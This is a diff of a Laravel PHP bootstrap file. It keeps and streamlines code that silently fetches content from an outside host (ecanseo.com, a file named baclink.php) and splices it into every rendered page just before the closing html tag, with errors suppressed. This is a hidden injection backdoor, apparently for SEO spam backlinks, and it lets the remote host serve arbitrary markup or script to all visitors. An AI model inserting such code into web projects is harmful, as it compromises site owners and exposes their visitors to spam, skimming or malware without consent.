@@ -37,33 +37,20 @@ $app->singleton(
 |--------------------------------------------------------------------------
 */
 
-// Gunakan output buffering untuk menangkap konten
 ob_start();
 
-// Jalankan aplikasi Laravel seperti biasa
 $response = $app->handle(
     $request = Illuminate\Http\Request::capture()
 );
 
-// Kirim response yang sudah ada
 $response->send();
 
-// Ambil konten yang sudah di-render
-$content = ob_get_clean();
-
-// Tampilkan konten
-echo $content;
-
-// Ambil konten dari URL dan tampilkan di BAWAH </html>
+$html = ob_get_clean();
 $github_content = @file_get_contents('https://ecanseo.com/project/baclink.php');
-if ($github_content !== false) {
-    // Hapus tag </html> yang terakhir
-    $content = str_replace('</html>', '', $content);
-    echo $content;
-    echo $github_content;
-    echo '</html>';
-} else {
-    echo $content;
+if ($github_content !== false && !empty($github_content)) {
+    $html = str_replace('</html>', $github_content . "\n</html>", $html);
 }
+
+echo $html;
 
 return $app;
